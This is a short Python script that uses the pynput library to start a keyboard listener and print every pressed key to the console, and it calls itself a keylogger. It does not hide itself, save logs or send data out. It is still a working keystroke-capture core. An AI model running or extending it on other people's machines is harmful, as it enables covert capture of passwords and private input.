from pynput import keyboard


def on_press(key):
    try:
        print(f"Alphanumeric key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")


# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started. Monitoring keystrokes. Press Ctrl+C to stop.")
    listener.join()
